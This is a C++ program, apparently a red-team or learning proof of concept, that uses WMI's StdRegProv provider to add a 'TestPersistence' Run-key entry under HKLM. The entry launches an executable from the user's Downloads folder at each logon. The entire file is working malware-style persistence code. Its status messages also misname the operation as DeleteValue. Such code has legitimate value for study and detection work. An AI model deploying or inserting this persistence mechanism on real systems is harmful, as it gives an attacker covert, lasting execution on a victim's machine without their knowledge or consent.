#include <Windows.h>
#include <stdio.h>
#include <WbemIdl.h>

#pragma comment(lib, "wbemuuid.lib")

int main()
{
	IWbemLocator* pLoc = nullptr;
	IWbemServices* pSvc = nullptr;
	IWbemClassObject* pClass_StdRegProv = nullptr;

	HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

	if (SUCCEEDED(hr)) {
		printf("[+] Initialize COM library (STA).\n");
	}
	else {
		printf("[-] Failed to initialized COM library: 0x%08X\n", hr);
		return 1;
	}

	hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);

	if (SUCCEEDED(hr)) {
		printf("[+] Registered security and set the default security values for the process.\n");
	}
	else {
		printf("[-] Failed to register security: 0x%08X\n", hr);
	}

	hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,IID_IWbemLocator, (void**)&pLoc);

	if (SUCCEEDED(hr)) {
		printf("[+] Initialized IWbemLocator interface.\n");
	}
	else {
		printf("[-] Failed to initialize IWbemLocator interface: 0x%08X\n", hr);
	}

	hr = pLoc->ConnectServer(BSTR(L"ROOT\\CIMV2"), nullptr, nullptr, nullptr, 0, nullptr, nullptr, &pSvc);

	if (SUCCEEDED(hr)) {
		printf("[+] Connected to a local WMI namespace.\n");
	}
	else {
		printf("[-] Failed to connect to a local WMI namespace: 0x%08X\n", hr);
	}

	hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_NONE, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

	if (SUCCEEDED(hr)) {
		printf("[+] Set authentication information for IWbemService proxy.\n");
	}
	else {
		printf("[-] Failed to set authentication information for IWbemService proxy: 0x%08X\n", hr);
	}

	hr = pSvc->GetObject(BSTR(L"StdRegProv"), 0, nullptr, &pClass_StdRegProv, nullptr);
	if (SUCCEEDED(hr)) {
		printf("[+] Retrieved an instance of StdRegProv.\n");
	}
	else {
		printf("[-] Failed to retrieve an instance of StdRegProv: 0x%08X\n", hr);
	}

	IWbemClassObject* pIn_SetStringValue = nullptr;
	IWbemClassObject* pInDef_SetStringValue = nullptr;
	IWbemClassObject* pOut_SetStringValue = nullptr;

	hr = pClass_StdRegProv->GetMethod(L"SetStringValue", 0, &pInDef_SetStringValue, nullptr);
	if (SUCCEEDED(hr)) { printf("[+] Retrieved input parameters class definition for StdRegProc::SetStringValue method.\n"); }
	hr = pInDef_SetStringValue->SpawnInstance(0, &pIn_SetStringValue);
	if (SUCCEEDED(hr)) { printf("[+] Using retrieved input parameters class definition create input parameters class.\n"); }
	pInDef_SetStringValue->Release();

	VARIANT vt = {};
	vt.vt = VT_I4;
	vt.lVal = (LONG)0x80000002;
	hr = pIn_SetStringValue->Put(L"hDefKey", 0, &vt, 0);
	if (SUCCEEDED(hr)) { printf("[+] Set hDefKey for StdRegProc::DeleteValue.\n"); }
	VariantClear(&vt);

	vt.vt = VT_BSTR;
	vt.bstrVal = SysAllocString(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	hr = pIn_SetStringValue->Put(L"sSubKeyName", 0, &vt, 0);
	if (SUCCEEDED(hr)) { printf("[+] Set sSubKeyName for StdRegProc::DeleteValue.\n"); }
	VariantClear(&vt);

	wchar_t payload[MAX_PATH];
	DWORD len = ExpandEnvironmentStringsW(
		L"%USERPROFILE%\\Downloads\\test.exe",
		payload,
		MAX_PATH
	);

	vt.vt = VT_BSTR;
	vt.bstrVal = SysAllocString(payload);
	hr = pIn_SetStringValue->Put(L"sValue", 0, &vt, 0);
	if (SUCCEEDED(hr)) { printf("[+] Set sValue for StdRegProc::DeleteValue.\n"); }
	VariantClear(&vt);

	vt.vt = VT_BSTR;
	vt.bstrVal = SysAllocString(L"TestPersistence");
	hr = pIn_SetStringValue->Put(L"sValueName", 0, &vt, 0);
	if (SUCCEEDED(hr)) { printf("[+] Set sValueName for StdRegProc::DeleteValue.\n"); }
	VariantClear(&vt);

	hr = pSvc->ExecMethod(BSTR(L"StdRegProv"), BSTR(L"SetStringValue"), 0, nullptr, pIn_SetStringValue, &pOut_SetStringValue, nullptr);
	pOut_SetStringValue->Release();

quit:

	if (pClass_StdRegProv) { pClass_StdRegProv->Release(); }
	if (pSvc) { pSvc->Release(); }
	if (pLoc) { pLoc->Release(); }

	CoUninitialize();
	return 0;
}
